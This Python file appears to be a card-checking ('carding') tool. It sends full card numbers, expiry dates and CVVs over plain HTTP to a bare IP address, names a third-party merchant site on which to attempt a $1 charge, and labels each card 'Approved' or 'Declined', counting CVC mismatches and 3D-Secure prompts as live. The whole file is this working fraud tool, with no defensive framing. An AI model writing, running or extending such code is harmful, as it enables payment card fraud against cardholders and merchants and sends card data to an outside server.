"""
Adyen $1 Gateway
API Endpoint: http://31.97.9.26:3000/checkout
"""
import aiohttp
import asyncio
import json
import re

async def adyen1_check(cc: str, mm: str, yy: str, cvv: str, site: str = "https://vasileandpavel.com") -> dict:
    """
    Adyen $1 charge gateway
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
        site: Adyen site URL
    
    Returns:
        dict: {'status': str, 'response': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # API endpoint
    api_url = f"http://31.97.9.26:3000/checkout?cc={full_card}&site={site}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=aiohttp.ClientTimeout(total=50)
            ) as resp:
                api_response = await resp.text()
                
                # Parse JSON response
                try:
                    data = json.loads(api_response)
                except json.JSONDecodeError:
                    # Parse as text
                    if re.search(r"\b(approved|charged|success|authorized)\b", api_response, re.I):
                        return {
                            'status': 'Approved',
                            'response': api_response[:200]
                        }
                    elif "declined" in api_response.lower():
                        return {
                            'status': 'Declined',
                            'response': api_response[:200]
                        }
                    else:
                        return {
                            'status': 'Unknown',
                            'response': api_response[:200]
                        }
                
                # Extract data
                response = data.get("Response", "Unknown")
                gateway = data.get("Gateway", "Adyen")
                price = data.get("Price", "$1")
                status = data.get("status", "Unknown")
                
                # Determine status
                if re.search(r"\b(approved|charged|success|authorized)\b", response, re.I):
                    final_status = "Approved"
                elif "3D" in response.upper() or "AUTHENTICATION" in response.upper():
                    final_status = "Approved"
                elif "INCORRECT_CVC" in response.upper():
                    final_status = "Approved"
                elif "DECLINED" in response.upper():
                    final_status = "Declined"
                else:
                    final_status = "Declined"
                
                return {
                    'status': final_status,
                    'response': response,
                    'gateway': gateway,
                    'price': price
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Unknown',
            'response': 'API request timed out'
        }
    except Exception as e:
        return {
            'status': 'Unknown',
            'response': f'Error: {str(e)}'
        }
